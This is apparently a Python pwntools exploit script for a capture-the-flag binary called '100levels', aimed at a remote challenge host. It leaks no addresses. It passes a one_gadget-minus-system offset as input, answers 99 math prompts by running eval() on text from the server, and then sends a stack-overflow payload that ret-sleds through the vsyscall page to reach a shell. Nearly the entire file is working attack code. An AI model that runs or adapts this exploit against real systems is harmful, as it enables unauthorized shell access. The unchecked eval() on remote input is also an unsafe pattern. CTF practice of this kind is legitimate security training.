from pwn import *
#from LibcSearcher import *
#context.log_level = 'debug'
debug = 0
file_name = './100levels'
libc_name = './libc.so'
ip = '111.198.29.45'
prot = '37483'
# if debug:
#     r = process(file_name)
#     libc = ELF(libc_name)
# else:

r = remote("111.198.29.45", "38218")
libc = ELF(libc_name)
file = ELF(file_name)
sl = lambda x: r.sendline(x)
sd = lambda x: r.send(x)
sla = lambda x, y: r.sendlineafter(x, y)
rud = lambda x: r.recvuntil(x, drop=True)
ru = lambda x: r.recvuntil(x)
li = lambda name, x: log.info(name + ':' + hex(x))
ri = lambda: r.interactive()

one_gg = 0x4526a
system_symbols = libc.symbols['system']
diff = one_gg - system_symbols
li("one_gg", one_gg)
li("system plt", system_symbols)

# hint
ru("Choice:\n")
sl("2")
ru("Choice:\n")
sl("1")
ru("How many levels?\n")
sl("0")
ru("Any more?\n")
sl(str(diff))
print str(diff)

for x in range(99):
    ru("Question: ")
    formula = rud("=")
    answer = eval(formula)
    ru("Answer:")
    sl(str(answer))

ru("Question: ")
formula = rud("=")
answer = eval(formula)
syscall_addr = 0xffffffffff600000
pay = "a" * 0x38 + p64(0xffffffffff600000) * 3
ru("Answer:")
sd(pay)
ri()
